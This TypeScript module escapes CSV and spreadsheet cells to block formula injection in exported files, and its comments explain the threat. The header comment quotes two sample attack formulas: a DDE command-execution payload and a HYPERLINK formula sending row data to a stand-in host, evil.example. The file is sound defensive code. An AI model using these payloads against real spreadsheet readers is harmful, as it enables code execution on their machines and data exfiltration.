// Deliberately not marked `server-only`: these are pure string functions with
// no database, secret or request access, and keeping them importable lets the
// regression test exercise the escaping directly instead of only through a
// spawned server.
//
// Every export in this system is opened in Excel, LibreOffice or Google Sheets
// by somebody other than the person who typed the data — Finance, an Admin, or
// the accountant the file is emailed to. A cell whose first character is `=`,
// `+`, `-` or `@` is evaluated as a formula by all three, which turns a free
// text project name or receipt description into code that runs on the reader's
// machine (`=cmd|' /C calc'!A0`) or quietly exfiltrates the row
// (`=HYPERLINK("http://evil.example","klik")`).
//
// The injecting party does not need to be an attacker from outside: `projects:
// "manage"` is a role default, so any Engineer or PM can name a project.
//
// Leading TAB and CR are in the pattern on purpose. Excel strips them before it
// looks at the next character, so `\t=cmd|…` is still a formula while a naive
// `/^[=+\-@]/` sees a tab and waves it through.
const FORMULA_PREFIX = /^[=+\-@\t\r]/;

/**
 * Neutralises one cell for a spreadsheet. Prefixing with an apostrophe is the
 * documented "this is text" escape that every spreadsheet honours and that no
 * spreadsheet displays.
 *
 * Real numbers pass through untouched: a JS number can never be a formula, and
 * quoting a negative amount would turn `-500` into the text `'-500` and break
 * every sum in the financial exports.
 */
export function safeSpreadsheetText(value: unknown) {
  if (typeof value === "number" && Number.isFinite(value)) return String(value);
  if (typeof value === "bigint") return String(value);
  const text = value === null || value === undefined ? "" : String(value);
  return FORMULA_PREFIX.test(text) ? `'${text}` : text;
}

/**
 * One CSV field: neutralised, quote-doubled, and always quoted. Always quoting
 * is deliberate — a conditional quote has to get the "does this need quoting"
 * test exactly right for commas, quotes, CR, LF and leading whitespace, and
 * getting it wrong shifts every later column of the row.
 */
export function csvCell(value: unknown) {
  return `"${safeSpreadsheetText(value).replaceAll('"', '""')}"`;
}
